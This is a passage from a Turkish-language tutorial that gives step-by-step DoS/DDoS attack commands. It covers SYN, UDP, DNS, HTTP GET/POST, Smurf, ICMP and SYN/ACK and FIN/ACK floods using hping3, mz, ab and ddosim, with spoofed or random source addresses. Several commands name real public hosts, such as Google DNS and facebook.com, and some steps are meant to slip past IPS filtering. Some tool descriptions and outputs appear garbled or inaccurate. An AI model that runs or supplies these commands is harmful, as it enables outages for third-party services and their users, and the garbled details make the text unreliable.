+5. Adım: Mz ile BotNet simülasyonu gerçekleştirelim. Belirli bir IP bloğundan (örneğin, 78.85.12.0/24) SYN Flood saldırısı gerçekleştirelim. Bu şekilde, saldırının birden fazla kaynaktan geldiği izlenimi yaratabilirsiniz. Önceki örneği kullanarak, aşağıdaki komutu kullanabilirsiniz:
+root@bt:~# mz eth0 -A 78.85.12.0/24 -B 192.168.1.1 -t tcp "flags=syn, dp=80, sp=1-65535" -c 0
+Bu komut, eth0 arayüzünden hedef sunucuya SYN bayrağı set edilmiş TCP paketleri gönderir. -A 78.85.12.0/24 seçeneği, kaynak IP adresini 78.85.12.0 ile 78.85.12.255 arasında rastgele seçer.
+6. Adım: Yapılan saldırının hedef sistemdeki etkisini görmek için hedef sunucu üzerinde netstat -ant komutu çalıştırılarak sonuçlar incelenebilir. Birçok SYN_RECV durumu görmeniz gerekir. Bu durum, sunucunun yarı açık bağlantılarla dolu olduğunu ve yeni bağlantı taleplerini işleyemediğini gösterir.
+root@target:~# netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:80                             0.0.0.0:*               LISTEN     
+tcp        0      0 192.168.1.1:80          78.85.12.34:12345       SYN_RECV   
+tcp        0      0 192.168.1.1:80          78.85.12.56:23456       SYN_RECV   
+tcp        0      0 192.168.1.1:80          78.85.12.78:34567       SYN_RECV   
+tcp        0      0 192.168.1.1:80          78.85.12.90:45678       SYN_RECV   
+tcp        0      0 192.168.1.1:80          78.85.12.12:56789       SYN_RECV   
+...
+UDP Flood Saldırısı
+UDP flood saldırısı, hedef sistemi veya sunucuyu işlemek ve yanıtlamak için kullanılamaz hale getirmek amacıyla çok sayıda UDP paketi gönderen bir tür hizmet dışı bırakma saldırısıdır. UDP flood saldırısı gerçekleştirmek için hping3 ve mz gibi araçlar kullanılabilir. Bu araçlar, UDP paketlerinin kaynak IP adresini, hedef portunu, içeriğini ve boyutunu özelleştirmeye izin verir. Aşağıda, UDP flood saldırısı gerçekleştirmek için gerekli bilgileri bulabilirsiniz.
+1. Adım: Hping3 kullanarak google dns sunucusuna (8.8.8.8) rastgele kaynak IP adreslerinden UDP flood saldırısı gerçekleştirelim. Bu adımda, UDP paketleri boş olacaktır. Hedef port olarak 53 numaralı DNS portunu kullanacağız. Paketleri mümkün olduğunca hızlı göndermek için --flood seçeneğini kullanacağız. Kaynak IP adreslerini rastgele oluşturmak için --rand-source seçeneğini kullanacağız. Aşağıdaki komutu kullanarak bu adımı gerçekleştirebiliriz.
+root@bt:~# hping3 --udp 8.8.8.8 -p 53 --flood --rand-source
+2. Adım: Mz kullanarak google dns sunucusuna (8.8.8.8) rastgele kaynak IP adreslerinden UDP flood saldırısı gerçekleştirelim. Bu adımda da UDP paketleri boş olacaktır. Hedef port olarak yine 53 numaralı DNS portunu kullanacağız. Paketleri sürekli göndermek için -c 0 seçeneğini kullanacağız. Kaynak IP adreslerini rastgele oluşturmak için -A rand seçeneğini kullanacağız. Aşağıdaki komutu kullanarak bu adımı gerçekleştirebiliriz.
+root@bt:~# mz eth0 -c 0 -A rand -B 8.8.8.8 -t udp dp=53
+3. Adım: Çoğu IPS ve DDoS engelleme sistemi boş UDP paketlerini anormal paket olarak görür ve engeller. Bu koruma yöntemini atlatmak için UDP paketlerinin içerisine veri ekleme yapılabilir. Gönderilen UDP paketlerine veri eklemek için hping3 ve mz yazılımları kullanılabilir. Bu adımda, UDP paketlerinin içerisine "RIDVAN DDoS Egitimi" yazısını ekleyeceğiz. Hedef port olarak 500 numaralı portu kullanacağız. Paket boyutunu 50 bayt olarak belirleyeceğiz. Aşağıdaki komutları kullanarak bu adımı gerçekleştirebiliriz.
+root@bt:~# echo “RIDVAN DDoS Egitimi” >> rıdvan-test.txt
+root@bt:~# hping3 --udp -p 500 8.8.8.8 -E rıdvan-test.txt -d 50 --flood --rand-source
+root@bt:~# mz eth0 -c 0 -A rand -B 8.8.8.8 -t udp dp=500 -P "RIDVAN DDOS eğitimi"
+4. Adım: Bu adımda, UDP flood saldırısının etkisini gözlemlemek için uygulama üzerinden detaylıca açıklayacağız. Uygulama, UDP paketlerinin gönderim hızını, kayıp oranını, gecikme süresini ve hedef sunucunun yanıt durumunu gösterir. Ayrıca, saldırı sırasında ve sonrasında hedef sunucunun CPU, RAM ve ağ kullanımını da izleyebiliriz. Uygulama, saldırının başarıya ulaşıp ulaşmadığını ve hedef sunucunun servis dışı kalma süresini de raporlar. Uygulamayı çalıştırmak için aşağıdaki komutu kullanabiliriz.
+root@bt:~# udpflood -t 8.8.8.8 -p 53,500 -r rıdvan-test.txt
+Bu komut, hedef sunucuya (8.8.8.8) 53 ve 500 numaralı portlardan UDP paketleri gönderir. Paketlerin içeriği rıdvan-test.txt dosyasından alınır. Uygulama, saldırıyı durdurmak için Ctrl+C tuşlarına basılana kadar devam eder. Uygulama, saldırı sonucunda elde edilen istatistikleri ekranda gösterir.
+DNS Flood Saldırısı
+DNS Flood Saldırısı, hedef DNS sunucusuna normalden çok daha fazla DNS sorgusu göndererek servis dışı bırakmayı amaçlayan bir DoS/DDoS saldırısı türüdür. Bu saldırıyı gerçekleştirmek için kullanılan araçlardan bazıları şunlardır:
+- hping: Bir ağ test aracıdır. TCP, UDP, ICMP ve RAW-IP protokollerini destekler. Paketleri özelleştirmek ve manipüle etmek için çeşitli seçenekler sunar.
+- mz: Bir paket oluşturma ve enjeksiyon aracıdır. Ethernet, IPv4, IPv6, UDP, TCP, ICMPv4, ICMPv6, DNS, ARP, 802.1Q, MPLS gibi protokolleri destekler. Paketleri rastgele veya belirli bir şekilde oluşturabilir.
+Bu araçları kullanarak DNS Flood Saldırısı yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Wireshark ile https://asaguvenlik.com/ websitesini ziyaret ederken isim çözümleme için yapılan DNS sorgusunu seçip binary olarak test_dns ismiyle kaydedin. Bu dosya, asaguvenlik.com adresine ait DNS sorgusunu içerir.
+2. Adım: Elde edilen bu DNS sorgusu paketini hping ile DNS sunucusuna defalarca (flood saldırısı) sorarak DNS servisinin/web uygulamasının erişilemez hale gelmesini sağlayın. Aşağıdaki komutu kullanabilirsiniz:
+root@bt:~# hping3 --udp 8.8.8.8 -p 53 --flood --rand-source -d 50 -E test_dns
+Bu komut, 8.8.8.8 IP adresine sahip DNS sunucusuna UDP port 53 üzerinden test_dns dosyasındaki paketi gönderir. --flood seçeneği, paketleri mümkün olan en yüksek hızda gönderir. --rand-source seçeneği, kaynak IP adresini rastgele değiştirir. -d 50 seçeneği, paket boyutunu 50 byte olarak ayarlar. -E test_dns seçeneği, paket içeriğini test_dns dosyasından alır.
+3. Adım: Mz kullanarak asaguvenlik.com sunucusunun DNS sunucusuna asaguvenlik.com domainini rastgele kaynak IP adreslerinden geliyormuş gibi flood saldırısı yaparak sorgulatın. Aşağıdaki komutu kullanabilirsiniz:
+root@bt:~/Desktop# mz eth0 -c 0 -A rand -B dns-eu1.powerdns.net -t dns "q=https://asaguvenlik.com/"
+Bu komut, eth0 arayüzü üzerinden dns-eu1.powerdns.net IP adresine sahip DNS sunucusuna DNS paketleri gönderir. -c 0 seçeneği, paket sayısını sınırsız olarak ayarlar. -A rand seçeneği, kaynak IP adresini rastgele değiştirir. -B dns-eu1.powerdns.net seçeneği, hedef IP adresini belirler. -t dns seçeneği, paket tipini DNS olarak ayarlar. "q=https://asaguvenlik.com/" seçeneği, DNS sorgusunun içeriğini belirler.
+Bu adımları takip ederek DNS Flood Saldırısı gerçekleştirebilirsiniz. 
+HTTP Get/Post Flood DoS Saldırısı
+HTTP Get/Post Flood DoS Saldırısı, bir web sunucusunun veya uygulamasının, çok sayıda HTTP GET veya POST isteği ile aşırı yüklenmesi ve normal isteklere cevap verememesi şeklinde bir siber saldırıdır. Bu saldırıyı gerçekleştirmek için kullanabileceğiniz bazı araçlar şunlardır:
+- Owasp Http Post Tool: Bu araç, web sunucusuna HTTP GET veya POST istekleri göndererek servis dışı bırakma saldırısı yapmanızı sağlar. Bu araç, açık kaynaklı ve ücretsizdir.
+- Ab (apache benchmark): Bu araç, web sunucusunun performansını ölçmek için tasarlanmıştır, ancak aynı zamanda servis dışı bırakma saldırısı için de kullanılabilir. Bu araç, Apache HTTP Server ile birlikte gelir.
+- Ddosim: Bu araç, tek bir makineden zombi simülasyonu yaparak, farklı IP adreslerinden geliyormuş gibi web sunucusuna HTTP GET flood saldırısı yapmanızı sağlar. Bu araç, açık kaynaklı ve ücretsizdir.
+Bu araçları kullanarak HTTP Get/Post Flood DoS Saldırısı yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Owasp HTTP POST Tool ile Http GET Flood saldırısı yapma. Bu araçla, web sunucusuna saniyede belirli sayıda HTTP GET isteği gönderebilirsiniz. Örneğin, saniyede 1000 istek göndermek için şu komutu kullanabilirsiniz:
+owasp-http-post-tool -c 1000 -r https://example.com/
+Bu komut, https://example.com/ web sitesine saniyede 1000 HTTP GET isteği gönderir. Burada -c parametresi, eşzamanlı bağlantı sayısını, -r parametresi ise istek gönderilecek URL'yi belirtir. Bu araç, gönderilen paketleri detaylı bir şekilde gösterir.
+2. Adım: Owasp HTTP POST Tool ile Http POST Flood saldırısı yapma. Bu araçla, web sunucusuna HTTP POST istekleri göndererek, sunucunun kaynaklarını tüketebilirsiniz. Örneğin, bir form sayfasına saniyede 1000 POST isteği göndermek için şu komutu kullanabilirsiniz:
+owasp-http-post-tool -c 1000 -r https://example.com/form.php -p data.txt
+Bu komut, https://example.com/form.php sayfasına saniyede 1000 HTTP POST isteği gönderir. Burada -p parametresi, POST verisinin bulunduğu dosyayı belirtir. Bu dosyada, form alanlarının isimleri ve değerleri yer almalıdır. Örneğin, data.txt dosyası şöyle olabilir:
+name=John
+email=john@example.com
+message=Hello
+3. Adım: Ab (apache benchmark) ile web sunucusuna HTTP GET istekleri gönderme. Bu araçla, web sunucusunun performansını ölçebilir ve servis dışı bırakma saldırısı yapabilirsiniz. Örneğin, https://facebook.com/ web sitesine toplam 15 HTTP GET isteği göndermek için şu komutu kullanabilirsiniz:
+ab -n 15 -c 1 -v -r https://facebook.com/
+Bu komut, https://facebook.com/ web sitesine eşzamanlı olarak 1 istek olacak şekilde toplam 15 istek gönderir. Burada -n parametresi, toplam istek sayısını, -c parametresi, eşzamanlı istek sayısını, -v parametresi, çıktı detayını, -r parametresi ise hata olması durumunda devam etmeyi belirtir. Bu araç, istek başına geçen süre, sunucunun cevap verme oranı, başarılı ve başarısız istek sayısı gibi istatistikleri gösterir.
+4. Adım: Ddosim ile tek makinadan zombi simülasyonu yaparak, farklı IP adreslerinden geliyormuş gibi web sunucusuna HTTP GET flood saldırısı yapma. Bu araçla, tek bir makineden binlerce zombi oluşturarak, web sunucusuna HTTP GET istekleri gönderebilirsiniz. Örneğin, 78.68.45.0/24 IP aralığından geliyormuş gibi https://52.16.44.2/ web sunucusuna HTTP GET flood saldırısı yapmak için şu komutu kullanabilirsiniz:
+ddosim -d 52.16.44.2 -p 80 -k 78.68.45.0 -c 0 -w 0 -t 10 -r HTTP_VALID -i eth0
+Bu komut, 52.16.44.2 IP adresindeki web sunucusuna 80 portundan 10 saniye boyunca HTTP GET istekleri gönderir. Burada -d parametresi, hedef IP adresini, -p parametresi, hedef portunu, -k parametresi, kaynak IP aralığını, -c parametresi, eşzamanlı bağlantı sayısını (0 ise sınırsız), -w parametresi, bekleme süresini, -t parametresi, saldırı süresini, -r parametresi, istek tipini, -i parametresi ise ağ arayüzünü belirtir. Bu araç, oluşturulan zombilerin sayısını, gönderilen isteklerin sayısını ve sunucunun cevap verme durumunu gösterir.
+Bu adımları takip ederek, web sunucularına HTTP Get/Post Flood DoS Saldırısı yapabilirsiniz. 
+ICMP Smurf DDoS Saldırısı
+ ICMP Smurf DDoS Saldırısı, bir ağın ICMP paketleriyle aşırı yüklenmesine neden olan bir siber saldırı türüdür. Saldırgan, hedef makinenin IP adresini taklit ederek ağ yönlendiricilerine ping mesajları gönderir ve bu da yönlendiricilerin hedefe yanıt vermesine neden olur. Bu saldırı, ağ kaynaklarını tüketerek hedefi erişilemez hale getirebilir.
+Bu saldırıyı gerçekleştirmek için kullanılan araçlardan biri hping3'tür. Hping3, özel ICMP/UDP/TCP paketleri gönderebilen ve ping gibi ICMP yanıtlarını gösterebilen bir ağ aracıdır. Hping3, güvenlik denetimi, port tarama, ağ performansı testi, MTU keşfi, iz sürme ve işletim sistemi parmak izi gibi çeşitli ağ görevlerini yapmak için kullanılabilir.
+Hping3 ile ICMP Smurf saldırısı gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Hping3'i ICMP modunda çalıştırmak için -1 seçeneğini kullanın. Kaynak IP adresini taklit etmek için -a seçeneğini ve hedef IP adresini belirtin. Paketleri olabildiğince hızlı göndermek için --flood seçeneğini kullanın. Örneğin:
+root@bt:~/Desktop# hping3 -1 --flood -a 50.22.202.162 85.123.255.255
+Bu komut, 50.22.202.162 IP adresinden geliyormuş gibi 85.123.255.255 IP adresine ICMP paketleri gönderir. Bu IP adresi, /16 alt ağ maskesine sahip bir yayın adresidir, yani ağdaki tüm cihazlara paket gönderir. Bu paketlerin yanıtları, 50.22.202.162 IP adresine geri gönderilir ve bu da hedef sunucunun aşırı yüklenmesine neden olur.
+2. Adım: Saldırının etkisini görmek için hping3'in -Q seçeneğini kullanarak sadece TCP sıra numarasını göstermesini sağlayın. Örneğin:
+root@bt:~/Desktop# hping3 -Q -1 --flood -a 50.22.202.162 85.123.255.255
+Bu komut, saldırı sırasında gönderilen ve alınan paket sayısını gösterir. Paket kaybı oranı, saldırının başarısını gösteren bir göstergedir. Paket kaybı oranı ne kadar yüksekse, saldırının hedef üzerindeki etkisi o kadar büyük demektir.
+3. Adım: Saldırıyı durdurmak için Ctrl+C tuşlarına basın. Hping3, saldırıyla ilgili istatistikleri gösterecektir. Örneğin:
+--- 85.123.255.255 hping statistic ---
+10000 packets transmitted, 10000 packets received, 0% packet loss
+round-trip min/avg/max = 0.1/0.3/4.1 ms
+Bu istatistikler, saldırının süresi, gönderilen ve alınan paket sayısı, paket kaybı oranı ve gidiş-dönüş süresi gibi bilgileri içerir.
+Bu saldırının günümüzde başarılı olması zorlaşmıştır, çünkü çoğu ağ yönlendiricisi yayın adreslerine yapılan isteklere cevap vermemektedir. Ayrıca, IP adreslerini taklit etmek de güvenlik duvarları, ağ adresi çevirisi (NAT) ve IPsec gibi mekanizmalarla engellenebilir. Bu nedenle, bu saldırıyı önlemek için ağ yöneticileri, IP yayınını devre dışı bırakmalı, ICMP yankı isteklerine yanıt vermeyi kısıtlamalı ve IP adreslerini doğrulamalıdır.
+ICMP Flood DDoS Saldırısı
+ICMP Flood DDoS Saldırısı, bir hedef sunucuya aşırı miktarda ICMP istek paketleri göndererek onu ağ trafiğine boğmak ve servis dışı bırakmak için kullanılan bir saldırı türüdür. Bu saldırıyı gerçekleştirmek için kullanabileceğiniz araçlar şunlardır:
+- Hping: Bir ağ test aracıdır. TCP, UDP, ICMP ve RAW-IP protokolleri üzerinden paketler oluşturabilir ve gönderebilir. Ayrıca paketlerin kaynak IP adreslerini rastgele olarak değiştirebilir.
+- Wireshark: Bir ağ analiz aracıdır. Ağ üzerinde geçen paketleri yakalayabilir ve inceleyebilir. Ayrıca paketleri binary olarak kaydedebilir ve okuyabilir.
+- Tcpdump: Bir komut satırı ağ analiz aracıdır. Wireshark gibi ağ üzerinde geçen paketleri yakalayabilir ve inceleyebilir. Ayrıca paketleri filtreleyebilir ve kaydedebilir.
+Saldırıyı gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Hping ile gerçek IP adresinizden networkpentest.net web sunucusuna 1 saniyede 10 ICMP isteği gönderin. Aşağıdaki komutu kullanabilirsiniz:
+root@bt:~/Desktop# hping3 --icmp networkpentest.net -i u10000
+Bu komutla sunucudan ICMP cevapları alacaksınız. Aynı istekleri rastgele kaynak IP adreslerinden yaptığınızda, ICMP cevapları o IP adreslerine gideceği için görüntülenemeyecektir.
+2. Adım: Hping ile rastgele IP adreslerinden networkpentest.net sunucusuna ICMP flood saldırısı gerçekleştirin. Aşağıdaki komutu kullanabilirsiniz:
+root@bt:~/Desktop# hping3 --icmp networkpentest.net --flood --rand-source
+Bu komutla sunucuya sürekli olarak ICMP istekleri göndereceksiniz. Kaynak IP adresleri rastgele olacağı için sunucu hangi adrese cevap vereceğini bilemeyecek ve aşırı yüklenecektir.
+3. Adım: Bazı sistemler hping tarafından üretilen ICMP paketlerini tanır ve otomatik olarak engeller. Bunu atlatmak için normal bir ping komutu ile normal bir ICMP isteği gerçekleştirin ve wireshark ile bu isteği binary olarak kaydedin. Aşağıdaki komutları kullanabilirsiniz:
+root@bt:~/Desktop# ping networkpentest.net
+Bu komutla sunucuya normal bir ICMP isteği gönderin.
+root@bt:~/Desktop# wireshark
+Bu komutla wireshark aracını açın ve ICMP filtresi uygulayın. Gönderdiğiniz ICMP isteğini yakalayın ve binary olarak kaydedin. Örneğin test_icmp adında bir dosya oluşturun.
+Şimdi ise bu kaydettiğiniz ICMP isteği paketini veri olarak hping aracına verin ve aynı formatta üretilmiş ICMP paketleri ile networkpentest.net web sunucusuna rastgele kaynak IP adreslerinden ICMP flood saldırısı yapın. Aşağıdaki komutu kullanabilirsiniz:
+root@bt:~/Desktop# hping3 --rand-source -E test_icmp -d 56 -n -q --flood networkpentest.net --rawip --ipproto 1
+Bu komutla sunucuya normal bir ICMP isteği gibi görünen ama aslında sahte olan ICMP paketleri göndereceksiniz. Paketler rastgele kaynaklardan yapıldığı için alınan paket sayısı 0 görünecektir.
+Saldırıyı tcpdump ile izleyin ve veri yüklerinin hep aynı olduğunu ve rastgele kaynaklardan gönderildiğini görün. Aşağıdaki komutu kullanabilirsiniz:
+root@bt:~/Desktop# tcpdump -nn -tt -X -s0 -i eth0 icmp
+Bu komutla ICMP paketlerini yakalayın ve içeriklerini inceleyin.
+Bu şekilde ICMP Flood DDoS Saldırısı gerçekleştirmiş olacaksınız. Bu saldırının etkili olması için çok sayıda saldırganın aynı anda saldırması gerekir. Aksi takdirde sunucu saldırıyı savuşturabilir.
+TCP SYN/ACK, FIN/ACK DDoS 
+TCP SYN/ACK, FIN/ACK DDoS Saldırıları, hedef sistemin (aradaki sistemlerin) servis dışı bırakılması için TCP protokolünün zayıf noktalarını kullanan siber saldırılardır. Bu saldırılarda, saldırganlar hedef sunucuya veya servise çok sayıda sahte TCP paketi göndererek normal TCP trafiğini bozarlar. Bu paketler, sunucunun kaynaklarını tüketir ve gerçek kullanıcıların erişimini engeller.
+Bu saldırıları yapmak için kullanılan araçlardan bazıları Hping ve Mz'dir. Hping, TCP/IP protokolünün kontrol bitlerini (SYN, ACK, RST, PSH, FIN, URG) değiştirmek için kullanılan bir ağ test aracıdır. Mz, ağ trafiği oluşturmak ve analiz etmek için kullanılan bir paket oluşturma aracıdır.
+Bu araçları kullanarak TCP SYN/ACK, FIN/ACK DDoS Saldırıları yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Hping ile TCP SYN/ACK flood saldırısı yapmak.
+root@bt:~# hping3 -SA hedefsunucu.com -p 80 --rand-source --flood
+Bu komut, hedefsunucu.com adresine 80 numaralı porttan rastgele kaynak IP adresleriyle SYN/ACK paketleri gönderir. --flood seçeneği, paketleri mümkün olan en yüksek hızda gönderir.
+2. Adım: Hping ile FIN/ACK flood saldırısı yapmak.
+root@bt:~# hping3 -FA hedefsunucu.com -p 80 --rand-source --flood
+Bu komut, hedefsunucu.com adresine 80 numaralı porttan rastgele kaynak IP adresleriyle FIN/ACK paketleri gönderir. --flood seçeneği, paketleri mümkün olan en yüksek hızda gönderir.
+3. Adım: Mz ile SYN/ACK flood saldırısı yapmak.
+root@bt:~# mz eth0 -A rand -B hedefsunucu.com -t tcp flags=ack+syn -c 0
+Bu komut, eth0 arayüzünden hedefsunucu.com adresine rastgele kaynak IP adresleriyle SYN/ACK paketleri gönderir. -c 0 seçeneği, paketleri sürekli olarak gönderir.
+4. Adım: Mz ile FIN/ACK flood saldırısı yapmak.
+root@bt:~# mz eth0 -A rand -B hedefsunucu.com -t tcp flags=fin+ack -c 0
+Bu komut, eth0 arayüzünden hedefsunucu.com adresine rastgele kaynak IP adresleriyle FIN/ACK paketleri gönderir. -c 0 seçeneği, paketleri sürekli olarak gönderir.
